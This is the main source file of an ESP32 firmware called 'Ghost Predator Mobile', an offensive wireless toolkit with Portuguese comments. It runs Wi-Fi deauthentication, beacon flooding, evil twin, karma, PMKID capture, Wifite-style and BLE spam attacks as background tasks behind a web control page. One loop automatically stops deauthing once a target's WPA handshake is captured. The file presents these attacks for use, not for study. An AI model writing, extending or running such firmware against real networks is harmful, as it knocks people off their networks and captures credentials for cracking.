#include <Arduino.h>
#include <LittleFS.h>
#include <ESPmDNS.h>
#include <esp_task_wdt.h>

#include "config.h"
#include "utils/logger.h"
#include "wifi/scanner.h"
#include "wifi/deauth.h"
#include "wifi/sniffer.h"
#include "wifi/evil_twin.h"
#include "wifi/beacon_flood.h"
#include "wifi/karma.h"
#include "wifi/radio2.h"
#include "wifi/pmkid_fisher.h"
#include "wifi/wps_scanner.h"
#include "wifi/target_intel.h"
#include "wifi/hidden_scanner.h"
#include "wifi/wifite_mode.h"
#include "bluetooth/ble_scanner.h"
#include "bluetooth/bt_classic.h"
#include "bluetooth/ble_spam.h"
#include "web/server.h"

void attackTask(void*) {
    for (;;) {
        Deauther::get().tick();
        BeaconFlood::get().tick();
        Sniffer::get().tick();
        EvilTwin::get().tick();
        Radio2::get().tick();
        PMKIDFisher::get().tick();
        HiddenScanner::get().tick();
        WifiteMode::get().tick();

        // Auto-stop deauth quando handshake completo capturado
        if (Deauther::get().running && Deauther::get().autoCapture) {
            auto& hs = Sniffer::get().handshakes;
            String apStr = Deauther::bssidStr(Deauther::get().targetAP);
            int m1=0, m2=0;
            for (auto& h : hs) {
                if (h.bssid == apStr || h.client == apStr) {
                    if (h.type == 1) m1++;
                    if (h.type == 2) m2++;
                }
            }
            if (m1 > 0 && m2 > 0) {
                Deauther::get().stop();
                LOG.success("[AUTO] Handshake M1+M2 completo para " + apStr + " — deauth parado");
            }
        }

        vTaskDelay(pdMS_TO_TICKS(1));
    }
}

void bleTask(void*) {
    for (;;) {
        BLESpam::get().tick();
        vTaskDelay(pdMS_TO_TICKS(50));
    }
}

void setup() {
    Serial.begin(115200);
    Serial.println("\n\n=== Ghost Predator Mobile v3.5 ===");

    pinMode(LED_STATUS, OUTPUT);
    digitalWrite(LED_STATUS, LOW);

    esp_task_wdt_init(30, true);
    esp_task_wdt_add(nullptr);

    if (!LittleFS.begin(false)) {
        LOG.warn("LittleFS mount falhou — formatando...");
        LittleFS.begin(true);
    }
    LOG.info("FS OK — livre: " + String((LittleFS.totalBytes() - LittleFS.usedBytes()) / 1024) + " KB");

    // Web server + AP WiFi
    WebServer::get().begin();

    // mDNS → http://ghostpredator.local
    if (MDNS.begin(MDNS_HOST)) {
        MDNS.addService("http", "tcp", 80);
        LOG.success("mDNS: http://" MDNS_HOST ".local");
    }

    // Karma: conecta callback do sniffer ao karma attack
    Sniffer::get().onProbe = [](const uint8_t* mac, const char* ssid, uint8_t ch) {
        KarmaAttack::get().onProbe(mac, ssid, ch);
        TargetIntel::get().updateDevice(WiFiScanner::bssidToStr(mac), 0, String(ssid));
    };

    // Deauther: bloqueia sniffer no canal do alvo durante ataque
    Deauther::get().fnLockChannel = [](uint8_t ch) { Sniffer::get().lockChannel(ch); };
    Deauther::get().fnResumeHop   = []()            { Sniffer::get().resumeHop(); };

    Radio2::get().begin();
    BLEScanner::get().begin();
    NimBLEDevice::init("GhostPredator");

    // FreeRTOS tasks
    xTaskCreatePinnedToCore(attackTask, "attacks", 16384, nullptr, 1, nullptr, 0);
    xTaskCreatePinnedToCore(bleTask,    "ble_spam", 4096, nullptr, 1, nullptr, 1);

    digitalWrite(LED_STATUS, HIGH);
    LOG.success("Ghost Predator Mobile v3.3 | AP: " AP_SSID " | http://" MDNS_HOST ".local");
    LOG.info("Heap: " + String(ESP.getFreeHeap() / 1024) + " KB livre");
}

void loop() {
    esp_task_wdt_reset();
    WebServer::get().tick();

    static unsigned long lastBlink = 0;
    bool anyActive = Deauther::get().running    ||
                     BeaconFlood::get().running  ||
                     Sniffer::get().running      ||
                     EvilTwin::get().running     ||
                     KarmaAttack::get().running  ||
                     PMKIDFisher::get().running  ||
                     WifiteMode::get().running   ||
                     BLESpam::get().running;

    uint16_t interval = Sniffer::get().running ? 120 : 700;
    if (millis() - lastBlink > interval) {
        lastBlink = millis();
        digitalWrite(LED_STATUS, anyActive ? !digitalRead(LED_STATUS) : HIGH);
    }

    delay(8);
}
